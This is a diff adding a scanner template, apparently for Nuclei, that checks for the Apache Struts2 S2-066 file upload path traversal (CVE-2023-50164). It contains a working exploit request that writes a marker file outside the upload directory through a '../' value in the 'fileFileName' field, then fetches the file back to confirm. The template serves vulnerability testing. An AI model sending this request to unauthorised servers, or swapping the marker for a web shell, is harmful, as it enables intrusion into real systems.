@@ -1,0 +1,46 @@
+id: local-struts2-s2-066-upload-traversal
+
+info:
+  name: Struts2 S2-066 File Upload Path Traversal (CVE-2023-50164)
+  author: pentest-platform
+  severity: critical
+  description: |
+    Apache Struts 2 S2-066 (CVE-2023-50164) file upload path traversal.
+    Uploads a marker file outside the restricted upload/ directory using
+    uppercase "File" field name and "fileFileName" path traversal, then verifies.
+  reference:
+    - https://cwiki.apache.org/confluence/display/WW/s2-066
+    - https://nvd.nist.gov/vuln/detail/CVE-2023-50164
+  tags: safe-poc,exploit,struts2,s2-066,cve,cve2023,file-upload,path-traversal
+
+http:
+  - raw:
+      - |
+        POST /index.action HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=s2066boundary
+
+        --s2066boundary
+        Content-Disposition: form-data; name="File"; filename="s2066rce.txt"
+        Content-Type: text/plain
+
+        pentest-platform-s2066-rce
+        --s2066boundary
+        Content-Disposition: form-data; name="fileFileName"
+
+        ../s2066rce.txt
+        --s2066boundary--
+
+      - |
+        GET /s2066rce.txt HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "pentest-platform-s2066-rce"
+      - type: status
+        status:
+          - 200
